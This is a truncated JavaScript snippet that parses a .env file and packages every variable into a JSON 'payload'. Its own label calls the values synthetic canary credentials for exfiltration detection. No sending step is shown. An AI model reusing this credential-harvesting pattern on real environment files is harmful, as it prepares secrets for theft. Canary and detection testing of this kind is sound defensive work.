function parseEnvFile(filePath) {
    const content = fs.readFileSync(filePath, 'utf8');
    const envVars = {};

    content.split('\n').forEach(line => {
        // Skip empty lines and comments
        line = line.trim();
        if (!line || line.startsWith('#')) {
            return;
        }

        // Parse key=value pairs
        const delimiterIndex = line.indexOf('=');
        if (delimiterIndex !== -1) {
            const key = line.substring(0, delimiterIndex).trim();
            const value = line.substring(delimiterIndex + 1).trim();
            envVars[key] = value;
        }
    });

    return envVars;
}

// Convert to JSON payload
function createPayload(envVars) {
    return {
        timestamp: new Date().toISOString(),
        source: ".env.test",
        description: "Synthetic test credentials — canary values for exfiltration detection",
        environment: "test",
        variables: envVars,
        metadata: {
